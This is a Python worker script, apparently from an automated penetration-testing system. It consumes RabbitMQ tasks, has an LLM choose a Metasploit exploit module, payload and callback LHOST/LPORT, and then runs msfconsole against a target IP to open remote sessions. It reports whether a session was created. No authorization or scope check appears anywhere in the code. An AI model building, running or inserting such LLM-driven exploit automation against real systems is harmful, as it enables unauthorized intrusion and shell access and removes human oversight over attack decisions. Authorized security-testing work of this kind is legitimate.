import os
import json
import pika
import time
import subprocess
from datetime import datetime
import uuid
import logging
import sys

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Add parent directory to sys.path for core module imports
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))
from core.clients import LLMRouterClient # type: ignore

# Environment variables for RabbitMQ
RABBITMQ_HOST = os.getenv('RABBITMQ_HOST', 'localhost')
RABBITMQ_USER = os.getenv('RABBITMQ_USER', 'guest')
RABBITMQ_PASS = os.getenv('RABBITMQ_PASS', 'guest')

# Environment variables for LLM Router
LLM_ROUTER_URL = os.getenv('LLM_ROUTER_URL', 'http://llm-router:8082')

# Queue names
TASK_QUEUE = 'exploit_adaptation_tasks'
RESULTS_QUEUE = 'results_queue'

# Worker type
WORKER_TYPE = 'exploit_adaptation_worker'
PRODUCER_VERSION = '0.1.0' # Version of this worker

def get_rabbitmq_connection():
    """Establishes and returns a RabbitMQ connection."""
    credentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
    parameters = pika.ConnectionParameters(RABBITMQ_HOST,
                                           5672,
                                           '/',
                                           credentials,
                                           heartbeat=600)
    return pika.BlockingConnection(parameters)

def publish_result(channel, result_data):
    """Publishes results to the results queue."""
    try:
        channel.basic_publish(
            exchange='',
            routing_key=RESULTS_QUEUE,
            body=json.dumps(result_data),
            properties=pika.BasicProperties(
                delivery_mode=2,  # make message persistent
            )
        )
        logger.info(f"Published result for task {result_data.get('task_id')}")
    except Exception as e:
        logger.error(f"Failed to publish result: {e}")

def execute_metasploit_exploit(exploit_module, target_ip, target_port, payload, lhost, lport, extra_options=None):
    """
    Executes a Metasploit exploit using msfconsole.
    This is a simplified example and would need robust error handling and output parsing.
    """
    logger.info(f"Attempting to execute Metasploit exploit: {exploit_module} on {target_ip}:{target_port}")

    rc_script_content = f"""
use {exploit_module}
set RHOSTS {target_ip}
set RPORT {target_port}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
"""
    if extra_options:
        for key, value in extra_options.items():
            rc_script_content += f"set {key} {value}\n"

    rc_script_content += "exploit -j -z\n" # -j for job, -z for don't interact with session

    # Write the RC script to a temporary file
    rc_file_path = f"/tmp/msf_exploit_{uuid.uuid4().hex}.rc"
    with open(rc_file_path, "w") as f:
        f.write(rc_script_content)

    command = ["msfconsole", "-q", "-r", rc_file_path]
    
    try:
        # Execute msfconsole and capture output
        process = subprocess.run(command, capture_output=True, text=True, timeout=300) # 5 minute timeout
        os.remove(rc_file_path) # Clean up RC script

        stdout = process.stdout
        stderr = process.stderr
        
        logger.debug(f"Metasploit stdout: {stdout}")
        if stderr:
            logger.error(f"Metasploit stderr: {stderr}")

        # Simple check for session creation (needs more robust parsing)
        if "Session" in stdout and "created" in stdout:
            session_id_match = re.search(r"Session (\d+) created", stdout)
            session_id = session_id_match.group(1) if session_id_match else "unknown"
            return True, stdout, {"session_id": session_id, "access_level": "user_level_placeholder"}
        elif "Exploit completed, but no session was created" in stdout:
            return False, stdout, {"reason": "Exploit completed, no session"}
        else:
            return False, stdout, {"reason": "Exploit failed or unexpected output"}

    except subprocess.TimeoutExpired:
        logger.error(f"Metasploit exploit timed out for {target_ip}")
        os.remove(rc_file_path)
        return False, "Timeout", {"reason": "Exploit timed out"}
    except FileNotFoundError:
        logger.error("msfconsole command not found. Is Metasploit installed and in PATH?")
        return False, "msfconsole not found", {"reason": "Metasploit not installed"}
    except Exception as e:
        logger.error(f"Error executing Metasploit: {e}")
        return False, str(e), {"reason": f"Internal error: {e}"}


def adapt_and_execute_exploit(vulnerability_details, target_details):
    """
    Uses LLM to adapt exploit parameters and then executes the exploit.
    """
    llm_client = LLMRouterClient(base_url=LLM_ROUTER_URL)
    
    # Example prompt for LLM to get exploit details
    prompt_payload = {
        "mode": "exploit_adaptation",
        "vulnerability": vulnerability_details,
        "target": target_details
    }

    try:
        llm_response = llm_client.deep_reason(prompt_payload)
        logger.info(f"LLM Exploit Adaptation Response: {llm_response}")

        # Parse LLM response for exploit details
        exploit_module = llm_response.get("exploit_module")
        payload = llm_response.get("payload")
        lhost = llm_response.get("lhost", os.getenv("AAPT_LHOST", "127.0.0.1")) # Default LHOST
        lport = llm_response.get("lport", os.getenv("AAPT_LPORT", "4444")) # Default LPORT
        extra_options = llm_response.get("extra_options", {})

        if not all([exploit_module, payload]):
            return False, "LLM did not provide sufficient exploit details.", {}

        # Extract target IP and port from target_details
        target_ip = target_details.get("ip")
        target_port = target_details.get("port") # Assuming port is part of target_details

        if not all([target_ip, target_port]):
            return False, "Target IP or Port missing for exploit execution.", {}

        success, raw_output, exploit_data = execute_metasploit_exploit(
            exploit_module, target_ip, target_port, payload, lhost, lport, extra_options
        )
        return success, raw_output, exploit_data

    except Exception as e:
        logger.error(f"Error during exploit adaptation or LLM interaction: {e}", exc_info=True)
        return False, f"LLM/Adaptation error: {e}", {}


def process_task(ch, method, properties, body):
    """Callback function to process incoming tasks."""
    try:
        task = json.loads(body)
        target = task.get('target')
        vulnerability_details = task.get('vulnerability_details') # Details about the vulnerability to exploit
        target_details = task.get('target_details') # Full target context
        task_id = task.get('task_id', str(uuid.uuid4()))
        correlation_id = task.get('correlation_id', task_id)

        logger.info(f"Processing exploit adaptation task for target: {target} (Task ID: {task_id})")

        exploit_successful, raw_output, exploit_data = adapt_and_execute_exploit(
            vulnerability_details, target_details
        )

        status = "success" if exploit_successful else "failure"
        summary = f"Exploit attempt on {target} - {'Successful' if exploit_successful else 'Failed'}. " \
                  f"Reason: {exploit_data.get('reason', 'N/A')}"

        result_data = {
            "schema_version": "1.2",
            "producer_version": PRODUCER_VERSION,
            "task_id": task_id,
            "correlation_id": correlation_id,
            "attempt": 1,
            "worker_type": WORKER_TYPE,
            "target": target,
            "status": status,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "summary": summary,
            "data": {
                "exploit_chain_step": {
                    "exploit_successful": exploit_successful,
                    "exploit_details": exploit_data,
                    "vulnerability_targeted": vulnerability_details,
                    "raw_exploit_output": raw_output # Potentially large, consider storing in file
                }
            },
            "raw_output_path": None, # Consider saving raw_exploit_output to a file
            "message_type": "exploit_chain_result",
            "media": None,
            "reason_codes": []
        }

        publish_result(ch, result_data)
        ch.basic_ack(delivery_tag=method.delivery_tag)

    except json.JSONDecodeError:
        logger.error(f"Failed to decode JSON from message: {body.decode()}")
        ch.basic_nack(delivery_tag=method.delivery_tag, requeue=False) # Don't requeue malformed messages
    except Exception as e:
        logger.error(f"Error processing task: {e}", exc_info=True)
        ch.basic_nack(delivery_tag=method.delivery_tag, requeue=True) # Requeue on unexpected errors

def main():
    """Main function to set up RabbitMQ consumer."""
    retries = 5
    for i in range(retries):
        try:
            connection = get_rabbitmq_connection()
            channel = connection.channel()
            channel.queue_declare(queue=TASK_QUEUE, durable=True)
            channel.queue_declare(queue=RESULTS_QUEUE, durable=True)

            channel.basic_consume(queue=TASK_QUEUE, on_message_callback=process_task)

            logger.info(f"[{WORKER_TYPE}] Waiting for messages in {TASK_QUEUE}. To exit press CTRL+C")
            channel.start_consuming()
        except pika.exceptions.AMQPConnectionError as e:
            logger.error(f"RabbitMQ connection error: {e}. Retrying in 10 seconds... ({i+1}/{retries})")
            time.sleep(10)
        except KeyboardInterrupt:
            logger.info("Exiting worker.")
            break
        except Exception as e:
            logger.error(f"An unexpected error occurred: {e}", exc_info=True)
            break
    else:
        logger.error("Failed to connect to RabbitMQ after multiple retries. Exiting.")

if __name__ == '__main__':
    # Ensure LLM_ROUTER_URL is set for LLMClient
    if not LLM_ROUTER_URL:
        logger.error("LLM_ROUTER_URL environment variable is not set. Exiting.")
        sys.exit(1)
    
    # Import re here to avoid circular dependency if core.clients imports this worker
    import re 
    main()
